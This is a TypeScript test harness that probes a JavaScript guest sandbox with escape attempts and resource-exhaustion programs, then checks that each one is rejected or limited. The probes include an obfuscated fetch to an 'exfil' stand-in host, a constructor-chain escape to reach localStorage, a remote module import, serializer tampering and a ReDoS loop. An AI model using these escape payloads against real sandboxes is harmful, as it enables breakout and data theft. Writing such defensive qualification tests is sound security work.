import type { StoreApi } from '../agent/types';
import { createJavaScriptGuest } from './javascriptGuestClient';
import { GUEST_CEILINGS, JAVASCRIPT_GUEST_PIN, type GuestLimits, type GuestOutcome } from './javascriptGuestProtocol';

type Challenge = { id: string; code: string; input?: string; limits?: Partial<GuestLimits>; expected?: string; stop?: boolean; outputBytes?: number; requireFailure?: boolean };
const challenges: Challenge[] = [
    { id: 'complete-input', code: 'return {sum:input.reduce((s,r)=>s+r,0),count:input.length};', input: '[-2,0,5]', expected: '{"sum":3,"count":3}' },
    { id: 'guest-global', code: 'return Function("return typeof fetch+typeof process+typeof indexedDB+typeof WebAssembly+typeof postMessage")();', expected: '"undefinedundefinedundefinedundefinedundefined"' },
    { id: 'network', code: 'return globalThis["fe"+"tch"]("https://example.invalid/exfil");' },
    { id: 'storage', code: 'return ({}).constructor.constructor("return globalThis")()["local"+"Storage"].getItem("guest-sentinel");' },
    { id: 'host-callback', code: 'return eval("postMessage({status:\\"completed\\"})");' },
    { id: 'import', code: 'return import("https://example.invalid/escape.js");' },
    { id: 'serializer-tampering', code: 'JSON.stringify=()=>"1"; return "x".repeat(1000);', limits: { outputBytes: 32 } },
    { id: 'utf8-output', code: 'return "😀".repeat(20);', limits: { outputBytes: 64 } },
    { id: 'infinite-loop', code: 'while(true){}', limits: { timeoutMs: 300 } },
    { id: 'heap', code: 'return new Array(200000).fill(7).length;', limits: { heapBytes: 1024 * 1024 }, requireFailure: true },
    { id: 'heap-control', code: 'return new Array(200000).fill(7).length;', expected: '200000' },
    { id: 'stack', code: 'function f(){return f()+1} return f();', limits: { stackBytes: 64 * 1024 } },
    { id: 'stop-running-guest', code: 'while(true){ /^(a+)+$/.test("a".repeat(100)+"!"); }', stop: true },
    { id: 'recovery', code: 'return input.rows.reduce((s,r)=>s+r.amount,0);', input: '{"rows":[{"amount":1},{"amount":2}]}', expected: '3' },
    { id: 'input-ceiling', code: 'return {length:input.length,last:input[input.length-1]};', input: '"' + 'x'.repeat(GUEST_CEILINGS.inputBytes - 2) + '"', expected: `{"length":${GUEST_CEILINGS.inputBytes-2},"last":"x"}` },
    { id: 'joint-ceiling', code: ' '.repeat(GUEST_CEILINGS.codeBytes - 43) + 'return input + "x".repeat(8 * 1024 * 1024);',
        input: '"' + 'x'.repeat(GUEST_CEILINGS.inputBytes - 2) + '"', outputBytes: GUEST_CEILINGS.outputBytes },
    { id: 'output-overflow', code: `return "x".repeat(${GUEST_CEILINGS.outputBytes-1});` },
];
export type GuestQualificationObservation = { id: string; passed: boolean; status: string; code: string; elapsedMs: number };

/** Local synthetic probes only. This does not grant Chatbox code execution. */
export const qualifyJavaScriptGuest = async (store: StoreApi, signal: AbortSignal,
    onObservation?: (value: GuestQualificationObservation) => void) => {
    const guest = createJavaScriptGuest(store);
    const observations: GuestQualificationObservation[] = [];
    try {
        for (const challenge of challenges) {
            if (signal.aborted) break;
            const start = performance.now();
            const stop = new AbortController();
            const abort = () => stop.abort();
            signal.addEventListener('abort', abort, { once: true });
            let stopTimer: ReturnType<typeof setTimeout> | undefined;
            let result: GuestOutcome;
            try {
                result = await guest.run(challenge.code, challenge.input ?? '{}', { signal: stop.signal, limits: challenge.limits,
                    onStarted: challenge.stop ? () => { stopTimer = setTimeout(abort, 50); } : undefined });
            } finally { signal.removeEventListener('abort', abort); clearTimeout(stopTimer); }
            const passed = challenge.stop ? result.status === 'cancelled' && performance.now() - start < 2000
                : challenge.outputBytes ? result.status === 'completed' && result.outputJson?.length === challenge.outputBytes
                    && JSON.parse(result.outputJson).length === challenge.outputBytes - 2
                : challenge.requireFailure ? result.status === 'failed' && ['guest_execution_rejected', 'guest_program_failed'].includes(result.code)
                : challenge.expected === undefined
                ? ['guest_execution_rejected', 'guest_program_failed', 'guest_output_invalid', 'guest_deadline', 'guest_worker_deadline', 'guest_async_unsupported', 'guest_output_capacity'].includes(result.code)
                    && ['failed', 'capacity', 'timeout'].includes(result.status)
                : result.status === 'completed' && result.outputJson === challenge.expected;
            const observation = { id: challenge.id, passed, status: result.status, code: result.code, elapsedMs: Math.round(performance.now() - start) };
            observations.push(observation);
            if (!signal.aborted) onObservation?.(observation);
        }
    } finally { guest.dispose(); }
    return { pin: JAVASCRIPT_GUEST_PIN, ceilings: GUEST_CEILINGS, observations,
        passed: !signal.aborted && observations.length === challenges.length && observations.every(value => value.passed),
        chatboxEnabled: false };
};
